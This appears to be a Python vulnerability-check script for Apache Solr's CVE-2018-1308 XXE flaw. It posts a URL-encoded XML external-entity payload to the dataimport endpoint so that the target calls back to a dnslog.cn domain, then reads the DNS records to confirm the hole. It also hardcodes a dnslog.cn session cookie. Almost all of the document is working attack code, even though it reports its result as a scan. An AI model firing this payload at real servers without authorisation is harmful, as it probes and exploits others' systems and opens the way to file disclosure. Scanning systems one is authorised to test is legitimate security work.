import requests
import json
import time


HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "en-US,en;q=0.5",
    "connection": "close",
    "user-agent": "mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/62.0.3202.94 safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}


DNS_HEADERS = {
"Accept": "*/*",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "zh-CN,zh;q=0.9",
"Connection": "keep-alive",
"Cookie": "UM_distinctid=1761c48a9aa8a0-0d283f9a0e01d-51402e1a-100200-1761c48a9ab7a2; PHPSESSID=b0vo952deup7ho6n6e482ddm37;, CNZZDATA1278305074=262987125-1606789220-%7C1608977604",
"Host": "www.dnslog.cn",
"Referer": "http://www.dnslog.cn/",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
}


def Get_core(ip):
    try:
        url = ip + "/solr/admin/cores?indexInfo=false&wt=json"
        r = requests.get(url, timeout=25, headers=HEADERS, verify=False)
        core_name = list(json.loads(r.text)["status"])[0]
    except:
        return "core获取失败"
    return core_name


def Get_dnslog():
    url = "http://www.dnslog.cn/getdomain.php?t=0.5081695881484336"
    r = requests.get(url, headers=DNS_HEADERS, timeout=25)
    return r.text


def main(ip):
    # core = Get_core(ip)
    dnslog = Get_dnslog()
    cmd = 'http://' + dnslog
    url = ip + '/solr/'+ 'test' + '/dataimport'
    data = f'''
command=full-import&dataConfig=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E
%3C!DOCTYPE+root+%5B%3C!ENTITY+%25+remote+SYSTEM+%22{cmd}%22%3E%25remote%3B%5D%3E
    '''
    r = requests.post(url, headers=HEADERS,data=data, timeout=25, verify=False)
    time.sleep(2)
    url = "http://www.dnslog.cn/getrecords.php?t=0.5081695881484336"
    r1 = requests.get(url, headers=DNS_HEADERS, timeout=25, verify=False)
    # print(r1.text)
    if "dnslog.cn" in r1.text:
        return "存在漏洞xxe_CVE-2018-1308，请及时修复!"
    else:
        return "不存在漏洞xxe_CVE-2018-1308"

# if __name__ == '__main__':
#     main("http://192.168.41.21:8983")